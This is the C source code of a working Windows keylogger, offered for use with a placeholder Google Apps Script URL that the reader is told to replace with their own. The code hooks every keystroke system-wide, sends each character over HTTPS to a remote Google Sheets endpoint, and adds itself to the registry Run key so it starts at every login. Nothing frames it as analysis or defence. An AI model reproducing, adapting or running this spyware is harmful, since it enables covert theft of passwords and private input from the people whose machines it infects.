#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <time.h>

#pragma comment(lib, "wininet.lib")  // Link WinINet

// === MODIFY THIS TO MATCH YOUR OWN DEPLOYED SCRIPT ===
const char* host = "script.google.com";
const char* path = "/macros/s/AKfycbzQK19fzs13d95nQGHYq1v0nC0s2yWo0vkRfqL7fTYvNK0Xmf2HosUbHQ-7c4tCQAxm/exec";  // Replace this

// Convert key code to readable char
char translateKey(DWORD vkCode) {
    BOOL shift = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
    BOOL caps = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;

    if (vkCode >= 'A' && vkCode <= 'Z') {
        if ((caps && !shift) || (!caps && shift))
            return (char)vkCode;
        else
            return (char)(vkCode + 32);
    }

    if (vkCode >= '0' && vkCode <= '9') {
        if (shift) {
            switch (vkCode) {
                case '1': return '!';
                case '2': return '@';
                case '3': return '#';
                case '4': return '$';
                case '5': return '%';
                case '6': return '^';
                case '7': return '&';
                case '8': return '*';
                case '9': return '(';
                case '0': return ')';
            }
        } else return (char)vkCode;
    }

    if (vkCode == VK_SPACE) return ' ';
    if (vkCode == VK_RETURN) return '\n';

    if (!shift) {
        switch (vkCode) {
            case VK_OEM_MINUS:  return '-';
            case VK_OEM_PLUS:   return '=';
            case VK_OEM_4:      return '[';
            case VK_OEM_6:      return ']';
            case VK_OEM_5:      return '\\';
            case VK_OEM_1:      return ';';
            case VK_OEM_7:      return '\'';
            case VK_OEM_COMMA:  return ',';
            case VK_OEM_PERIOD: return '.';
            case VK_OEM_2:      return '/';
        }
    } else {
        switch (vkCode) {
            case VK_OEM_MINUS:  return '_';
            case VK_OEM_PLUS:   return '+';
            case VK_OEM_4:      return '{';
            case VK_OEM_6:      return '}';
            case VK_OEM_5:      return '|';
            case VK_OEM_1:      return ':';
            case VK_OEM_7:      return '"';
            case VK_OEM_COMMA:  return '<';
            case VK_OEM_PERIOD: return '>';
            case VK_OEM_2:      return '?';
        }
    }

    return 0;
}

// Send keystroke to Google Sheets using WinINet
void sendToGoogleSheet(const char* key) {
    char postData[200];
    snprintf(postData, sizeof(postData), "{\"key\":\"%s\"}", key);

    HINTERNET hInternet = InternetOpen("KeyLogger", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return;

    HINTERNET hConnect = InternetConnect(hInternet, host, INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return;
    }

    HINTERNET hRequest = HttpOpenRequest(hConnect, "POST", path, NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
    if (!hRequest) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return;
    }

    const char* headers = "Content-Type: application/json\r\n";
    BOOL sent = HttpSendRequest(hRequest, headers, -1, (LPVOID)postData, strlen(postData));

    // Optional: read response (not used here)
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
}

// Add to Windows Startup (Registry key)
void addToStartup() {
    HKEY hKey;
    char path[MAX_PATH];
    GetModuleFileName(NULL, path, MAX_PATH);

    if (RegOpenKeyEx(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {

        RegSetValueEx(hKey, "MyKeyLogger", 0, REG_SZ, (const BYTE*)path, (DWORD)strlen(path) + 1);
        RegCloseKey(hKey);
    }
}

// Keyboard hook
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *)lParam;
        char c = translateKey(pKeyBoard->vkCode);
        if (c) {
            char str[2] = {c, 0};
            sendToGoogleSheet(str);
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// Main
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                   LPSTR lpCmdLine, int nShowCmd) {

    addToStartup();

    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (!hook) return 1;

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}
